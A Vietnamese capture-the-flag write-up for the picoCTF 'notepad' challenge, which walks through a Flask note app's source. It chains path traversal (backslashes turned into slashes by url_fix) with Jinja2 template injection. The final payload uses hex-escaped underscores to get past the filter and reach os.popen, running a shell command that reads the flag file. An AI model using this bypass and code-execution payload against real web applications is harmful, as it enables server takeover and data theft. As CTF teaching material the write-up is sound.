# nodepad
Trang web:

![img](397)

Nội dung code đính kèm:

**Docker file**

    FROM python:3.9.2-slim-buster

    RUN pip install flask gunicorn --no-cache-dir

    WORKDIR /app
    COPY app.py flag.txt ./
    COPY templates templates
    RUN mkdir /app/static && \
        chmod -R 775 . && \
        chmod 1773 static templates/errors && \
        mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt

    CMD ["gunicorn", "-w16", "-t5", "--graceful-timeout", "0", "-unobody", "-gnogroup", "-b0.0.0.0", "app:app"]

**app.py**

    from werkzeug.urls import url_fix
    from secrets import token_urlsafe
    from flask import Flask, request, render_template, redirect, url_for

    app = Flask(__name__)

    @app.route("/")
    def index():
        return render_template("index.html", error=request.args.get("error"))

    @app.route("/new", methods=["POST"])
    def create():
        content = request.form.get("content", "")
        if "_" in content or "/" in content:
            return redirect(url_for("index", error="bad_content"))
        if len(content) > 512:
            return redirect(url_for("index", error="long_content", len=len(content)))
        name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
        with open(name, "w") as f:
            f.write(content)
        return redirect(name)

**/templates/index.html**

    <!doctype html>
    {% if error is not none %}
    <h3>
        error: {{ error }}
    </h3>
    {% include "errors/" + error + ".html" ignore missing %}
    {% endif %}
    <h2>make a new note</h2>
    <form action="/new" method="POST">
    <textarea name="content"></textarea>
    <input type="submit">
    </form>

**/templates/error/bad_content.html**

    the note contained invalid characters

**/templates/error/long_content.html**

    your note (length {{ request.args.get("len") }}) was larger than the maximum (512)


Như vậy có thể thấy:
- Website được built với `Flask`
- Dựa vào dockerfile: `mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt`, file chứa flag sẽ có format là `flag-uuid.txt`, trong đó uuid là random. 
- Từ file `app.py`, tìm ra được 2 endpoint là `/` và `/new`, cho phép tạo một note mới, tôi sẽ không thể sử dụng các ký tự `_` và `/` trong nội dung của note, nếu không, sẽ gặp lỗi `bad_content`. Ngoài ra, nội dung không được vượt quá `512 ký tự`. Nếu không có gì vi phạm, note sẽ được tạo trong thư mục `static` với tên file bao gồm `128 ký tự đầu tiên` của nội dung note, theo sau là `-` với `8 ký tự ngẫu nhiên`, extension sẽ là `.html`. Về hàm [url_fix()](https://tedboy.github.io/flask/_modules/werkzeug/urls.html#url_fix). Tôi thấy rằng hàm này được sử dụng để chuẩn hóa links, trong hàm có dòng sau:

        s = to_unicode(s, charset, 'replace').replace('\\', '/')

Ký tự `\` được thay thế bằng `/` => Nếu điều không chặn sử dụng `\` thay vì `/`, tôi có thể bypass. Vì có một chuyển hướng trực tiếp dựa trên biến `name`, đại diện cho tên file của note đã tạo, tồn tại lỗ hổng `Path Traversal`. Điều này là do tôi có thể kiểm soát `128 ký tự đầu tiên` của tên file, vì chúng được lấy trực tiếp từ nội dung của note.

Lỗi bad_content:

![img](398)

=> Tham số `?error=bad_content` được truyền tương ứng với tên của lỗi và file bên trong thư mục `errors/` có tên `bad_content` được đưa vào trang. Lợi dụng `Path Traversal`, tôi có thể tạo một template bên trong thư mục `templates/errors` và bằng cách truyền tham số `?error=created_template_name`, tôi cũng có thể có thể khai thác lỗ hổng `SSTI`. 

Tôi thử nhập nội dung note là `{{7*7}}`:

![img](399)

Click Submit:

![img](400)

=> Tại sao lại `lỗi 404`? Việc duyệt đường dẫn đã hoạt động, có thể thấy từ URL file được tạo trong thư mục `/templates/errors/name_file.html`, tuy nhiên, tôi để ý rằng tên file `{{7*7}}-inEdFUFX3SI.html` chưa đáp ứng đủ điều kiện để bypass, tên file sẽ bao gồm `128 ký tự đầu tiên` từ nội dung note đã tạo, vì `{},*` là các ký tự đặc biệt, file được tạo trên máy chủ web, nhưng không thể truy cập nó vì máy chủ web không diễn giải tên file một cách chính xác. Tôi có thể bỏ qua vấn đề này bằng cách `chèn 128 ký tự được phép`, ví dụ `128` kí tự `A`, theo sau là `{{ 7*7 }}` (các ký tự bị máy chủ web hiểu sai):

    ..\templates\errors\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{{ 7*7 }}

![img](401)

![img](402)

Thành công tạo note, bây giờ tôi sẽ lấy ra tên file: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-6Ftd9Qn-cCw.html`, tách phần extension `.html` ra vì tham số `?error` trên URL ra vì nó chỉ nhận tên file:, truy cập `https://notepad.mars.picoctf.net/?error=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-6Ftd9Qn-cCw`

![img](403)

=> Thành công. Payload cuối cùng:

    ..\templates\errors\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo; cat flag*')|attr('read')() }}

![img](404)
